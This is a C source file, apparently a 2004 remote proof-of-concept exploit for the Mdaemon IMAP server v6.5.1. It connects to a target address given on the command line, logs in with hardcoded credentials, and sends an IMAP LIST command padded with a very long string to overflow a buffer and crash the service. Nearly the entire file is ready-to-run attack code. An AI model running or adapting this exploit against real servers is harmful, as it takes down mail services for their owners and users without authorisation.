/////////////////////////////////////////////////////////////
//            Remote proof-of-concept exploit              //
//                         for                             //
//               Mdaemon IMAP server v6.5.1                //
//	                   and                             //
//                possible other version.                  //
//                   Find bug: D_BuG.                      //
//                    Author: D_BuG.                       //
//                     D_BuG@bk.ru                         //                
//                   Data: 16/09/2004                      //
//                     NOT PUBLIC!                         //
//                                                         // 
/////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int     sock,err;
struct  sockaddr_in sa;


int main (int argc, char *argv[])
	
	{
	
	printf("Remote proof-of-concept(buffer overflow) exploit\n");
	printf("                         for                              \n");
	printf("Mdaemon IMAP server v6.5.1 and possible other version.\n");                    
	if(argc!=3)
	{
	printf("Usage: %s <IPADDRESS> <PORT>\n",argv[0]);
	printf("e.g.:%s 192.168.1.1 143\n",argv[0]);
	exit(-1);
	}


    sa.sin_family=AF_INET;
	sa.sin_port=htons(atoi(argv[2]));
	if(inet_pton(AF_INET, argv[1], &sa.sin_addr) <= 0)
	printf("Error inet_pton\n");
		
	sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	
	printf("[~]Connecting...\n");
	
	if(connect(sock,(struct sockaddr *)&sa,sizeof(sa)) <0)
	{
	printf("[-]Connect filed....\nExit...\n");
	exit(-1);
	}


char send[]="0001 LOGIN ""test"" ""console""\r\n";
char send3[]=
"007x LIST "
"""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAA"""
""" *BBBBBBBBBBaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAc"""
"\r\n\r\n";
char rcv[1024];


		printf("[+]Ok!\n");
		sleep(2);
		printf("[~]Get banner...\n");
		if(read(sock,&rcv,sizeof(rcv)) !=-1){}
		    
		if(strstr(rcv,"IMAP")==NULL)
		{
		printf("[-]Failed!\n");
		}
		else
		{ 
		printf("[+]Ok!\n");
    		}
								 
		printf("[~]Send LOGIN and PASSWORD...\n");
		write(sock,send,sizeof(send)-1);
		sleep(2);
		memset(rcv,0,1024);
		if(read(sock,&rcv,sizeof(rcv)) !=-1){}
		
		if(strstr(rcv,"OK")==NULL)
		{
		printf("[-]Failed login or password...\nExit...");
		exit(-1);
		}
		
		printf("[+]Ok!\n");
		
		printf("[~]Send LIST...\n");
		write(sock,send3,sizeof(send3)-1);
		sleep(2);
		memset(rcv,0,1024);
		if(read(sock,&rcv,sizeof(rcv)) !=-1){}
		
		if(strstr(rcv,"BAD")!=NULL)
		{
		printf("[-]Exploit filed...please check your version Mdaemon!\n");
		printf("[-]Exit...\n");
		exit(-1);
		}
		printf("[+]Ok!\n");
		printf("[+]Crash service.....\n");
		printf("[~]Done.\n");
		
		close(sock);
		
return 0;

}
